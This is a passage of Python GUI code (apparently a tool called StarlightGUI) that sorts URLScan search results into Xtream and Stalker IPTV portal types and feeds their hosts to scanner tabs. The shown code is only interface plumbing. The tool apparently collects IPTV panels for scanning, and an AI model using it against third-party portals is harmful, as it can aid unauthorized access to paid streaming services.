                elif port in (8000,) and ("/c" in url or "portal" in url): ptype = "STALKER"
            r["_type"] = ptype
            self.us_tree.insert("","end", values=(ptype or "?", r["url"], r["title"], r["ip"], r["date"]))

    def _urlscan_open(self, event):
        """Double-click to open URL in browser."""
        sel = self.us_tree.selection()
        if sel:
            url = str(self.us_tree.item(sel[0])["values"][1])  # URL is column index 1
            import webbrowser
            webbrowser.open(url)

    def _urlscan_rightclick(self, event):
        """Right-click context menu on URLScan results."""
        row = self.us_tree.identify_row(event.y)
        if not row: return
        self.us_tree.selection_set(row)
        vals = self.us_tree.item(row)["values"]
        url = str(vals[1])  # URL is now column index 1 (after TYPE)
        import urllib.parse
        parsed = urllib.parse.urlparse(url if "://" in url else "http://" + url)
        host = parsed.hostname or ""
        port = parsed.port or 80
        hp = f"{host}:{port}" if port != 80 else host

        menu = tk.Menu(self, tearoff=0, bg="#1e1b4b", fg="#fff",
                       activebackground="#4f46e5", activeforeground="#fff",
                       font=("Segoe UI", 9))
        menu.add_command(label=f"Open in Browser", command=lambda: __import__('webbrowser').open(url))
        menu.add_separator()
        menu.add_command(label=f"Copy URL", command=lambda: self._copy(url))
        menu.add_command(label=f"Copy Host:Port ({hp})", command=lambda: self._copy(hp))
        menu.add_separator()
        menu.add_command(label="Add to Xtream Scanner", command=lambda: self._send_host_to("xtream", hp))
        menu.add_command(label="Add to Stalker Scanner", command=lambda: self._send_host_to("stalker", hp))
        menu.add_command(label="Add to Both Scanners", command=lambda: (self._send_host_to("xtream", hp), self._send_host_to("stalker", hp)))
        menu.tk_popup(event.x_root, event.y_root)

    def _send_host_to(self, target, hp):
        """Add a host:port to the specified scanner tab."""
        if target == "xtream":
            current = self.xt_hosts.get("1.0","end").strip()
            if current: self.xt_hosts.insert("end", "\n" + hp)
            else: self.xt_hosts.insert("1.0", hp)
        else:
            current = self.sk_hosts.get("1.0","end").strip()
            if current: self.sk_hosts.insert("end", "\n" + hp)
            else: self.sk_hosts.insert("1.0", hp)
        self._log(f"Added {hp} to {target}")

    def _urlscan_to_xtream(self):
        if not self.us_results: return
        import urllib.parse
        hosts = set()
        for r in self.us_results:
            parsed = urllib.parse.urlparse(r["url"] if "://" in r["url"] else "http://"+r["url"])
            h = parsed.hostname or ""
            p = parsed.port or 80
            if h: hosts.add(f"{h}:{p}")
        current = self.xt_hosts.get("1.0","end").strip()
        new = "\n".join(sorted(hosts))
        if current: self.xt_hosts.insert("end", "\n"+new)
        else: self.xt_hosts.insert("1.0", new)
        self._log(f"Added {len(hosts)} hosts to Xtream")

    def _urlscan_to_stalker(self):
        if not self.us_results: return
        import urllib.parse
        hosts = set()
        for r in self.us_results:
            parsed = urllib.parse.urlparse(r["url"] if "://" in r["url"] else "http://"+r["url"])
            h = parsed.hostname or ""
            p = parsed.port or 80
            if h: hosts.add(f"{h}:{p}")
        current = self.sk_hosts.get("1.0","end").strip()
        new = "\n".join(sorted(hosts))
        if current: self.sk_hosts.insert("end", "\n"+new)
        else: self.sk_hosts.insert("1.0", new)
        self._log(f"Added {len(hosts)} hosts to Stalker")

    def _urlscan_smart_send(self):
        if not self.us_results: return
        import urllib.parse
        xt, sk = set(), set()
        for r in self.us_results:
            parsed = urllib.parse.urlparse(r["url"] if "://" in r["url"] else "http://"+r["url"])
            h = parsed.hostname or ""
            p = parsed.port or 80
            if not h: continue
            hp = f"{h}:{p}"
            pt = r.get("_type","")
            if pt == "XTREAM": xt.add(hp)
            elif pt == "STALKER": sk.add(hp)
            else: xt.add(hp); sk.add(hp)
        if xt:
            current = self.xt_hosts.get("1.0","end").strip()
            new = "\n".join(sorted(xt))
            if current: self.xt_hosts.insert("end", "\n"+new)
            else: self.xt_hosts.insert("1.0", new)
        if sk:
            current = self.sk_hosts.get("1.0","end").strip()
            new = "\n".join(sorted(sk))
            if current: self.sk_hosts.insert("end", "\n"+new)
            else: self.sk_hosts.insert("1.0", new)
        self._log(f"Smart Send: {len(xt)} Xtream, {len(sk)} Stalker")


if __name__ == "__main__":
    app = StarlightGUI()
    app.mainloop()
